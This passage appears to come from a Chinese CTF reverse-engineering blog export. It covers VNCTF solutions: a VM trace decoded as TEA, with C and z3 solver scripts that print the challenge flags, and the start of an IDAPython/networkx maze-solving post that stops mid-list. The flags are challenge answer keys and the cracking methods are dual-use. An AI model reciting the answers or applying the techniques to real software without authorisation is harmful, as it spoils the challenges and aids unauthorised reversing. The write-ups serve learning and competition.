VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[13]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[13] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[13] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[14] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[14] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[15]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[15]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[15] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[15] += VM-&gt;REG[0]noppop REG[0]VM-&gt;REG[5] = 256VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[16]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]VM-&gt;REG[0] = VM-&gt;REG[16]VM-&gt;REG[0] *= VM-&gt;REG[5];VM-&gt;REG[16] = VM-&gt;REG[0]pop REG[0]VM-&gt;REG[16] += VM-&gt;REG[0]noppush REG[6]push REG[7]push REG[8]push REG[9]push REG[10]push REG[11]push REG[12]push REG[13]push REG[14]push REG[15]push REG[16]pop REG[1]pop REG[2]VM-&gt;REG[20] = 284VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 3906065887VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 4125344020CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 295VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 579781142VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 2312395361CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 306VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 1700499305VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 612671610CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 317VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 3655723000VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 977540402CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]pop REG[2]VM-&gt;REG[20] = 328VM-&gt;REG[0] = 340VM-&gt;_eip = 3 * VM-&gt;REG[0]VM-&gt;REG[0] = 2443935368VM-&gt;REG[19] = 387VM-&gt;REG[20] = 339CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 1778148540CMP VM-&gt;REG[0], VM-&gt;REG[2] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]pop REG[1]VM-&gt;REG[0] = 8206181CMP VM-&gt;REG[0], VM-&gt;REG[1] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;REG[0] = 393VM-&gt;_eip = 3 * VM-&gt;REG[0]vm quitVM-&gt;REG[3] = 2654435769VM-&gt;REG[4] = 613452VM-&gt;REG[5] = 34589VM-&gt;REG[6] = 108471VM-&gt;REG[7] = 1230791VM-&gt;REG[8] = 0VM-&gt;REG[17] = 16VM-&gt;REG[18] = 32VM-&gt;REG[19] = 352VM-&gt;REG[10] = 0VM-&gt;REG[11] = 32VM-&gt;REG[12] = 1VM-&gt;REG[8] += VM-&gt;REG[3] sum += 2654435769VM-&gt;REG[0] = VM-&gt;REG[2] v1 VM-&gt;REG[0] *= VM-&gt;REG[17]; v1 &lt;&lt; 4VM-&gt;REG[0] += VM-&gt;REG[4] (v1 &lt;&lt; 4) + 613452VM-&gt;REG[14] = VM-&gt;REG[0] VM-&gt;REG[14] = (v1 &lt;&lt; 4) + 613452VM-&gt;REG[0] = VM-&gt;REG[2] VM-&gt;REG[0] += VM-&gt;REG[8] v1 + sumVM-&gt;REG[15] = VM-&gt;REG[0] VM-&gt;REG[15] = (v1 + sum)VM-&gt;REG[0] = VM-&gt;REG[2] VM-&gt;REG[0] /= VM-&gt;REG[18] v1 &gt;&gt; 5VM-&gt;REG[0] += VM-&gt;REG[5] (v1 &gt;&gt; 5) + 34589VM-&gt;REG[16] = VM-&gt;REG[0] VM-&gt;REG[16] = (v1 &gt;&gt; 5) + 34589VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] ^= VM-&gt;REG[15]VM-&gt;REG[0] ^= VM-&gt;REG[16]VM-&gt;REG[1] += VM-&gt;REG[0] v0 += ((v1 &lt;&lt; 4) + 613452) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + 34589)VM-&gt;REG[0] = VM-&gt;REG[1]VM-&gt;REG[0] *= VM-&gt;REG[17]; v0 &lt;&lt; 4VM-&gt;REG[0] += VM-&gt;REG[6] v0 &lt;&lt; 4 + 108471VM-&gt;REG[14] = VM-&gt;REG[0] VM-&gt;REG[14] = (v0 &lt;&lt; 4 + 108471)VM-&gt;REG[0] = VM-&gt;REG[1] VM-&gt;REG[0] += VM-&gt;REG[8] v0 + sumVM-&gt;REG[15] = VM-&gt;REG[0] VM-&gt;REG[15] = (v0 + sum)VM-&gt;REG[0] = VM-&gt;REG[1]VM-&gt;REG[0] /= VM-&gt;REG[18] v0 &gt;&gt; 5VM-&gt;REG[0] += VM-&gt;REG[7] （v0 &gt;&gt; 5) + 1230791VM-&gt;REG[16] = VM-&gt;REG[0] VM-&gt;REG[16] = (v0 &gt;&gt; 5) + 1230791VM-&gt;REG[0] = VM-&gt;REG[14]VM-&gt;REG[0] ^= VM-&gt;REG[15]VM-&gt;REG[0] ^= VM-&gt;REG[16] VM-&gt;REG[2] += VM-&gt;REG[0] v1 += ((v0 &lt;&lt; 4) + 108471) ^ (v0 + sum) ^ (v0 &gt;&gt; 5) + 1230791VM-&gt;REG[11] -= VM-&gt;REG[12]CMP VM-&gt;REG[10], VM-&gt;REG[11] if yes: VM-&gt;_eip = 3 * VM-&gt;REG[19]VM-&gt;_eip = 3 * VM-&gt;REG[20]nopVM-&gt;REG[0] = 110 # NOputcharVM-&gt;REG[0] = 111putcharVM-&gt;_eip = 3 * VM-&gt;REG[20]nopVM-&gt;REG[0] = 121 # YESputcharVM-&gt;REG[0] = 101putcharVM-&gt;REG[0] = 115putcharVM-&gt;_eip = 3 * VM-&gt;REG[20]nopnop 一点点分析，发现是tea加密，提取出密文和key，解密即可 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;//加密函数void encrypt(uint32_t *v, uint32_t *k)&#123; uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) &#123; /* basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); &#125; /* end cycle */ v[0] = v0; v[1] = v1;&#125;//解密函数void decrypt(uint32_t *v, uint32_t *k)&#123; uint32_t v0 = v[0], v1 = v[1], sum = 0xC6EF3720, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) &#123; /* basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; &#125; /* end cycle */ v[0] = v0; v[1] = v1;&#125;int main()&#123; uint32_t key[] = &#123;613452, 34589, 108471, 1230791&#125;; uint32_t v[12] = &#123; 3906065887, 4125344020, 579781142, 2312395361, 1700499305, 612671610, 3655723000, 977540402, 2443935368, 1778148540, 8206181, 0&#125;; for (int i = 0; i &lt; 5; i++) &#123; decrypt(&amp;v[2 * i], key); &#125; printf(&quot;%s&quot;, (char *)v); return 0;&#125;// VNCTF&#123;ecd63ae5-8945-4ac4-b5a5-34fc3ade81e7&#125; 4.时空飞行IDA打开，发现流程非常的清晰，就是时间的问题。。。 先判断输入的日期 写脚本直接逆即可 12345678910111213141516171819202122232425262728293031323334353637from z3 import *from Crypto.Util.number import *def __ROL4__(a1, num): return (a1 &lt;&lt; num) &amp; 0XFFFFFFFF | (a1 &gt;&gt; (32-num)) &amp; 0xFFFFFFFFdef __ROR4__(a1, num): return (a1 &gt;&gt; num) &amp; 0XFFFFFFFF | (a1 &lt;&lt; (32-num)) &amp; 0xFFFFFFFFdef sub_401A3B(a1): return (a1 ^ __ROL4__(a1, 13) ^ __ROR4__(a1, 9)) &amp; 0XFFFFFFFFCK = [0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9, 0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9, 0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299, 0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279]dword_404040 = [0xFD07C452, 0xEC90A488, 0x68D33CD1, 0x96F64587]FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC]v5 = [0] * 32 + dword_404040j = 32for i in range(32): # 得到前面32个数 v5[j-1] = sub_401A3B(v5[j] ^ v5[j+1] ^ v5[j+2] ^ CK[j-1]) ^ v5[j+3] j = j - 1c = v5[:4]c = [c[i] ^ FK[i] for i in range(4)]data = b&quot;&quot;for i in range(4): data += long_to_bytes(c[i])print(data)# 0211205 然后再往下，用Z3解 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990from z3 import *from Crypto.Util.number import *flag = [BitVec(&quot;flag1_%d&quot; % i, 32) for i in range(66)]# len = 24dword_404080 = [0x00000025, 0x00000015, 0x000000DF, 0x000000A2, 0x000000C0, 0x00000093, 0x000000AD, 0x00000014, 0x00000046, 0x000000C5, 0x0000000F, 0x0000002E, 0x0000009A, 0x000000EB, 0x00000030, 0x000000F8, 0x00000020, 0x000000E9, 0x000000CB, 0x00000088, 0x000000C6, 0x000000BE, 0x0000008D, 0x000000E3]dword_4050C0 = [0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000]def HIBYTE(a1): return (a1 &gt;&gt; 24) &amp; 0XFFdef BYTE2(a1): return (a1 &gt;&gt; 16) &amp; 0XFFdef BYTE1(a1): return (a1 &gt;&gt; 8) &amp; 0XFFdef BYTE(a1): return a1 &amp; 0XFFdef sub_401FFB(a1, a2): v3 = [0] * 7 # sub_401EFB v3[0] = HIBYTE(a1) v3[1] = BYTE2(a1) v3[2] = BYTE1(a1) v3[3] = BYTE(a1) # sub_401F67 tmp = [0] * 6 for i in range(4): tmp[i] = v3[i] v4 = 1 for i in range(4): v3[i] = tmp[v4] v4 = v4 + 1 v4 = v4 % 4 # sub_401EA7 v4 = (v3[3] &amp; 0XFFFFFFFF) | ((v3[2] &lt;&lt; 8) &amp; 0XFFFFFFFF) | ( (v3[1] &lt;&lt; 16) &amp; 0XFFFFFFFF) | ((v3[0] &lt;&lt; 24) &amp; 0XFFFFFFFF) return (v4 ^ dword_4050C0[a2]) &amp; 0XFFFFFFFF# flag = [0X31323334, 0X35363738, 0X39303132,# 0x33343536, 0x37383930, 0x31323334] + [0] * 60v5 = 6v3 = 0while v5 &lt;= 65: if v5 % 6: flag[v5] = flag[v5 - 6] ^ flag[v5 - 1] else: v2 = flag[v5 - 6] flag[v5] = v2 ^ sub_401FFB(flag[v5 - 1], v3) v3 = v3 + 1 v5 = v5 + 1v4 = [0] * 24for i in range(6): v4[4 * i] = BYTE(flag[i + 60]) v4[4 * i + 1] = BYTE1(flag[i + 60]) v4[4 * i + 2] = BYTE2(flag[i + 60]) v4[4 * i + 3] = HIBYTE(flag[i + 60])for i in range(1, 24, 1): v4[i - 1] ^= (v4[i - 1] % 18 + v4[i] + 5) ^ 0x41s = Solver()for i in range(24): s.add(v4[i] == dword_404080[i])s.add(flag[0] == 1447969620) # VNCTassert s.check() == satprint(&quot;SUCCESS&quot;)m = s.model()real_flag = b&quot;&quot;for i in range(6): real_flag += long_to_bytes(m[flag[i]].as_long())print(real_flag)# VNCTF&#123;TimeFlightMachine&#125; 去掉空字符为flag： VNCTF{TimeFl20211205ightMachine}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"vm","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"}]},{"title":"networkx 解决CTF_RE图最短路径问题","slug":"networkx解决CTF_RE图问题","date":"2021-12-09T07:38:00.000Z","updated":"2021-12-09T07:40:22.708Z","comments":true,"path":"2021/12/09/networkx解决CTF_RE图问题/","link":"","permalink":"https://zzzzsky.github.io/2021/12/09/networkx%E8%A7%A3%E5%86%B3CTF_RE%E5%9B%BE%E9%97%AE%E9%A2%98/","excerpt":"","text":"networkx 解决CTF_RE图最短路径问题前言最近复现了了下今年L3HCTF的IDAAAAA题，然后通过此题又联想到了之前做的一道特殊的迷宫题invisible_maze-fix,发现通过python的networkx解决此类问题相当的方便，因此记录下解题过程，方便以后查询。 2道题目附件👇 链接：https://pan.baidu.com/s/1reVYGScanSCs5H4ykl60vw提取码：kvhl invisible_maze常规的迷宫题目在CTF逆向题目中，常规的迷宫题目一般是程序给你一个非常长的字符串，然后自己整理可以得到整个迷宫的全貌，比如下图这种 这种能很容易的得到整个迷宫的路径，可是这个invisible_maze这个题才可以说是是真正的迷宫题，因为它没有从上帝视角给你路径的全貌，而是把你放到了个迷宫中，每走一步，它告诉你，上下左右分别去哪 本题题解分析IDA打开程序分析 进入sub_401050函数， 程序告诉你上下左右走的话是什么东西，很明显，只有进入另一个函数路才是通的 直接查找字符串，交叉引用来到成功的地方 可以发现只有进入到sub_41F1E0,然后再按s才会成功，而整个迷宫的路径是非常复杂的 观察函数窗口，发现从sub_401050 到 sub_41F270 全是这样的结构，我们手动的去画出整个迷宫显然是不现实的，每个函数其实就是一个节点，然后两个节点就构成了一条边，比如：sub_401050就是一个节点，而sub_401050 ---&gt; sub_4010E0就是一条边。 每个函数的结构基本差不多，考虑打算用IDAPython打印出每个节点，以及它对应的adsw对应的四个值，如果是进入另外一个函数的话，那么本函数和进入的那个函数就构造成了一条边，最后将节点和边传入python的networkx库就能构造出整个迷宫图，直接调用函数就能求最短路径了。 发现函数只有下面2种情况 当经过case表跳转后，如果第一条汇编指令是push xxx，那么肯定是不通的（除了成功的那个位置），如果是call sub_xxx的话，那么本条汇编指令就可以找到下一个函数（节点），如果是pop esi的话，下一条jmp xxx就是进入的下一个函数（节点） 编写IDAPython脚本写IDAPython脚本 1234567891011121314151617181920212223242526272829303132333435363738def get_edges_from_func(func_addr): func_end_addr = idc.find_func_end(func_addr) # 找到此函数末尾地址 addr = func_addr while addr &lt; func_end_addr: addr = idc.next_head(addr) # 得到下一条汇编指令的地址 if idc.print_insn_mnem(addr) == &#x27;movzx&#x27;: # 得到本条汇编指令的操作指令 index_table_addr = get_operand_value(addr ,1) # 得到adsw对应的索引表，对应上2图的0x4010C0 和 0x41E384 addr = idc.next_head(addr) # 来到Jmp ds:xxxx[eax * 4]的位置 switch_table_addr = get_operand_value(addr ,0) # 得到case表的地址 break value = get_bytes(index_table_addr, 23) index_adws = [value[0], value[3], value[18], value[22]] # 获取adsw对应的4个数 # print(index_adws) edges = [] for i in index_adws: # 遍历 tmp = get_wide_dword(switch_table_addr + i * 4) if idc.print_insn_mnem(tmp) == &#x27;push&#x27;: edges.append(None) elif idc.print_insn_mnem(tmp) == &#x27;call&#x27;: edges.append(get_operand_value(tmp ,0)) # 得到call的那个函数的地址 elif idc.print_insn_mnem(tmp) == &#x27;pop&#x27;: tmp = idc.next_head(tmp) # 来到jmp sub_xxx的地址 edges.append(get_operand_value(tmp ,0)) # print(edges) return edgesfunc_list = list(Functions(0x401050, 0x41F271)) # 列出此范围所有的函数all_edges = []for i in func_list: edges = get_edges_from_func(i) all_edges.append(edges)print(all_edges)print(&quot;len(func_list): %d&quot; % len(func_list))print(&quot;len(all_edges): %d&quot; % len(all_edges))print(func_list) 输入结果 1234[[None, 4198624, None, None], [4198480, None, 4198784, None], [None, None, 4207712, 4198624], [None, 4199104, 4211312, None], [4198944, 4199264, None, None], [4199104, 4199424, None, None], [4199264, 4199584, None, None], [4199424, 4199744, None, None], [4199584, 4199904, 4211472, None], [4199744, 4200064, None, None], [4199904, 4200224, None, None], [4200064, 4200384, None, None], [4200224, 4200544, None, None], [4200384, 4200688, None, None], [4200544, 4200848, None, None], [4200688, 4201008, None, None], [4200848, 4201168, None, None], [4201008, 4201312, None, None], [4201168, 4201456, None, None], [4201312, 4201616, None, None], [4201456, 4201776, None, None], [4201616, 4201936, None, None], [4201776, 4202096, None, None], [4201936, 4202240, None, None], [4202096, 4202384, None, None], [4202240, 4202544, None, None], [4202384, 4202704, None, None], [4202544, 4202848, None, None], [4202704, 4203008, None, None], [4202848, 4203168, None, None], [4203008, 4203328, None, None], [4203168, 4203488, None, None], [4203328, 4203648, None, None], [4203488, 4203808, None, None], [4203648, 4203968, None, None], [4203808, 4204128, None, None], [4203968, 4204272, None, None], [4204128, 4204432, None, None], [4204272, 4204592, None, None], [4204432, 4204752, None, None], [4204592, 4204912, None, None], [4204752, 4205056, None, None], [4204912, 4205216, None, None], [4205056, 4205376, None, None], [4205216, 4205536, None, None], [4205376, None, 4211632, None], [None, 4205824, 4211792, None], [4205680, 4205984, None, None], [4205824, 4206144, None, None], [4205984, 4206304, None, None], [4206144, 4206448, None, None], [4206304, 4206608, None, None], [4206448, 4206768, None, None], [4206608, 4206928, None, None], [4206768, 4207088, None, None], [4206928, 4207232, None, None], [4207088, 4207392, None, None], [4207232, 4207552, None, None], [4207392, None, 4211952, None], [None, 4207872, None, 4198784], [4207712, 4208032, None, None], [4207872, 4208192, None, None], [4208032, 4208352, None, None], [4208192, 4208496, None, None], [4208352, 4208656, None, None], [4208496, 4208816, None, None], [4208656, 4208960, None, None], [4208816, 4209120, 4212112, None], [4208960, 4209280, None, None], [4209120, 4209440, None, None], [4209280, 4209600, None, None], [4209440, 4209760, None, None], [4209600, 4209904, None, None], [4209760, 4210064, None, None], [4209904, 4210224, None, None], [4210064, 4210368, None, None], [4210224, 4210528, None, None], [4210368, 4210688, 4212272, None], [4210528, 4210832, None, None], [4210688, 4210992, None, None], [4210832, 4211152, None, None], [4210992, 4211312, None, None], [4211152, None, None, 4198944], [None, None, 4212432, 4199744], [None, None, 4216832, 4205536], [None, None, 4216992, 4205680], [None, None, 4217136, 4207552], [None, None, 4218240, 4208960], [None, None, 4218400, 4210528], [None, None, 4218560, 4211472], [None, 4212752, 4218720, None], [4212592, 4212912, None, None], [4212752, 4213072, None, None], [4212912, 4213232, None, None], [4213072, 4213392, None, None], [4213232, 4213552, None, None], [4213392, 4213696, None, None], [4213552, 4213856, None, None], [4213696, 4214016, None, None], [4213856, 4214176, None, None], [4214016, 4214320, None, None], [4214176, 4214480, None, None], [4214320, 4214640, None, None], [4214480, 4214800, None, None], [4214640, 4214960, None, None], [4214800, 4215120, None, None], [4214960, 4215280, None, None], [4215120, 4215440, None, None], [4215280, 4215584, None, None], [4215440, 4215744, None, None], [4215584, 4215904, None, None], [4215744, 4216064, None, None], [4215904, 4216208, None, None], [4216064, 4216352, None, None], [4216208, 4216512, None, None], [4216352, 4216672, None, None], [4216512, None, 4218880, None], [None, None, 4219040, 4211632], [None, None, 4219200, 4211792], [None, None, 4219360, 4211952], [None, 4217440, 4219520, None], [4217296, 4217600, None, None], [4217440, 4217760, None, None], [4217600, 4217920, None, None], [4217760, 4218080, None, None], [4217920, None, 4219680, None], [None, None, 4219840, 4212112], [None, None, 4219984, 4212272], [None, None, 4220144, 4212432], [None, None, 4220304, 4212592], [None, None, 4220464, 4216672], [None, None, 4220608, 4216832], [None, None, 4220768, 4216992], [None, None, 4222032, 4217136], [None, None, 4222192, 4217296], [None, None, 4222352, 4218080], [None, None, 4222496, 4218240], [None, None, 4222640, 4218400], [None, None, 4223248, 4218560], [None, None, 4223856, 4218720], [None, None, 4225584, 4218880], [None, None, 4225744, 4219040], [None, 4220928, None, 4219200], [4220768, 4221088, None, None], [4220928, 4221232, None, None], [4221088, 4221392, None, None], [4221232, 4221552, None, None], [4221392, 4221712, None, None], [4221552, 4221872, None, None], [4221712, None, 4225888, None], [None, None, 4226048, 4219360], [None, None, 4226208, 4219520], [None, None, 4226688, 4219680], [None, None, 4227008, 4219840], [None, None, 4227168, 4219984], [None, 4222928, None, None], [4222800, 4223088, None, None], [4222928, 4223248, None, None], [4223088, 4223408, None, 4220144], [4223248, 4223568, None, None], [4223408, 4223712, None, None], [4223568, None, None, None], [None, None, 4227328, 4220304], [None, 4224176, 4227488, None], [4224016, 4224336, None, None], [4224176, 4224496, None, None], [4224336, 4224656, None, None], [4224496, 4224816, None, None], [4224656, 4224976, None, None], [4224816, 4225120, None, None], [4224976, 4225264, None, None], [4225120, 4225424, None, None], [4225264, None, 4227648, None], [None, None, 4227808, 4220464], [None, None, 4227968, 4220608], [None, None, 4228112, 4221872], [None, None, 4228272, 4222032], [None, None, 4228576, 4222192], [None, 4226528, 4228736, None], [4226368, 4226688, None, None], [4226528, None, None, 4222352], [None, 4227008, 4228896, None], [4226848, None, None, 4222496], [None, None, 4229056, 4222640], [None, None, 4229680, 4223856], [None, None, 4229840, 4224016], [None, None, 4230928, 4225424], [None, None, 4231088, 4225584], [None, None, 4231248, 4225744], [None, None, 4232208, 4225888], [None, 4228416, None, 4226048], [4228272, None, 4232368, None], [None, None, 4232672, 4226208], [None, None, 4232832, 4226368], [None, None, 4232992, 4226848], [None, None, 4233152, 4227168], [None, 4229376, 4233312, None], [4229216, 4229520, None, None], [4229376, 4229680, None, None], [4229520, None, None, 4227328], [None, 4229984, None, 4227488], [4229840, 4230144, None, None], [4229984, 4230288, None, None], [4230144, 4230448, None, None], [4230288, 4230608, None, None], [4230448, 4230768, None, None], [4230608, None, 4233472, None], [None, None, 4233616, 4227648], [None, None, 4233776, 4227808], [None, None, 4233920, 4227968], [None, 4231568, 4234080, None], [4231408, 4231728, None, None], [4231568, 4231888, None, None], [4231728, 4232048, None, None], [4231888, None, 4234240, None], [None, None, 4234400, 4228112], [None, 4232528, None, 4228416], [4232368, None, 4234560, None], [None, None, 4234880, 4228576], [None, None, 4235328, 4228736], [None, None, 4235792, 4228896], [None, None, 4236576, 4229056], [None, None, 4236736, 4229216], [None, None, 4238784, 4230768], [None, None, 4238944, 4230928], [None, None, 4239104, 4231088], [None, None, 4239264, 4231248], [None, None, 4239424, 4231408], [None, None, 4239584, 4232048], [None, None, 4239744, 4232208], [None, 4234720, None, 4232528], [4234560, None, 4239904, None], [None, 4235040, None, 4232672], [4234880, 4235200, None, None], [4235040, 4235328, None, None], [4235200, None, 4240064, 4232832], [None, 4235632, 4240368, None], [4235488, 4235792, None, None], [4235632, 4235952, None, 4232992], [4235792, 4236112, None, None], [4235952, 4236272, None, None], [4236112, 4236432, None, None], [4236272, None, None, None], [None, None, 4240528, 4233152], [None, 4236896, None, 4233312], [4236736, 4237056, None, None], [4236896, 4237216, None, None], [4237056, 4237376, None, None], [4237216, 4237520, None, None], [4237376, 4237664, None, None], [4237520, 4237824, None, None], [4237664, 4237984, None, None], [4237824, 4238144, None, None], [4237984, 4238304, None, None], [4238144, 4238464, None, None], [4238304, 4238624, None, None], [4238464, 4238784, None, None], [4238624, None, None, 4233472], [None, None, 4240688, 4233616], [None, None, 4240848, 4233776], [None, None, 4241008, 4233920], [None, None, 4241168, 4234080], [None, None, 4241312, 4234240], [None, None, 4241456, 4234400], [None, None, 4241616, 4234720], [None, 4240224, None, 4235328], [4240064, 4240368, None, None], [4240224, None, None, 4235488], [None, None, 4241776, 4236576], [None, None, 4246640, 4238944], [None, None, 4246800, 4239104], [None, None, 4246960, 4239264], [None, None, 4247120, 4239424], [None, None, 4247280, 4239584], [None, None, 4247440, 4239744], [None, None, 4247904, 4239904], [None, 4241936, None, 4240528], [4241776, 4242096, None, None], [4241936, 4242256, None, None], [4242096, 4242416, None, None], [4242256, 4242576, None, None], [4242416, 4242736, None, None], [4242576, 4242896, None, None], [4242736, 4243040, None, None], [4242896, 4243200, None, None], [4243040, 4243360, None, None], [4243200, 4243504, None, None], [4243360, 4243664, None, None], [4243504, 4243824, None, None], [4243664, 4243984, None, None], [4243824, 4244144, None, None], [4243984, 4244288, None, None], [4244144, 4244448, None, None], [4244288, 4244608, None, None], [4244448, 4244768, None, None], [4244608, 4244928, None, None], [4244768, 4245072, None, None], [4244928, 4245232, None, None], [4245072, 4245392, None, None], [4245232, 4245536, None, None], [4245392, 4245696, None, None], [4245536, 4245840, None, None], [4245696, 4246000, None, None], [4245840, 4246160, None, None], [4246000, 4246320, None, None], [4246160, 4246480, None, None], [4246320, 4246640, None, None], [4246480, None, None, 4240688], [None, None, 4248064, 4240848], [None, None, 4248224, 4241008], [None, None, 4248384, 4241168], [None, None, 4248544, 4241312], [None, None, 4248704, 4241456], [None, None, 4248864, None], [None, 4247904, 4249184, None], [4247744, None, None, 4241616], [None, None, 4257312, 4246800], [None, None, 4257472, 4246960], [None, None, 4257632, 4247120], [None, None, 4257760, 4247280], [None, None, 4257920, 4247440], [None, 4249024, 4258080, 4247600], [4248864, 4249184, None, None], [4249024, None, None, 4247744], [None, 4249504, 4258240, None], [4249344, 4249664, None, None], [4249504, 4249824, None, None], [4249664, 4249984, None, None], [4249824, 4250144, None, None], [4249984, 4250304, None, None], [4250144, 4250464, None, None], [4250304, 4250624, None, None], [4250464, 4250784, None, None], [4250624, 4250944, None, None], [4250784, 4251088, None, None], [4250944, 4251248, None, None], [4251088, 4251408, None, None], [4251248, 4251568, None, None], [4251408, 4251712, None, None], [4251568, 4251872, None, None], [4251712, 4252032, None, None], [4251872, 4252192, None, None], [4252032, 4252336, None, None], [4252192, 4252496, None, None], [4252336, 4252656, None, None], [4252496, 4252816, None, None], [4252656, 4252976, None, None], [4252816, 4253136, None, None], [4252976, 4253296, None, None], [4253136, 4253456, None, None], [4253296, 4253616, None, None], [4253456, 4253776, None, None], [4253616, 4253936, None, None], [4253776, 4254096, None, None], [4253936, 4254240, None, None], [4254096, 4254400, None, None], [4254240, 4254544, None, None], [4254400, 4254704, None, None], [4254544, 4254848, None, None], [4254704, 4255008, None, None], [4254848, 4255152, None, None], [4255008, 4255312, None, None], [4255152, 4255472, None, None], [4255312, 4255616, None, None], [4255472, 4255776, None, None], [4255616, 4255936, None, None], [4255776, 4256080, None, None], [4255936, 4256240, None, None], [4256080, 4256400, None, None], [4256240, 4256560, None, None], [4256400, 4256704, None, None], [4256560, 4256848, None, None], [4256704, 4257008, None, None], [4256848, 4257152, None, None], [4257008, None, 4258400, None], [None, None, 4258544, 4248064], [None, None, 4258704, 4248224], [None, None, None, 4248384], [None, None, 4258864, 4248544], [None, None, 4259024, 4248704], [None, None, 4259184, 4248864], [None, None, 4259344, 4249344], [None, None, 4263760, 4257152], [None, None, 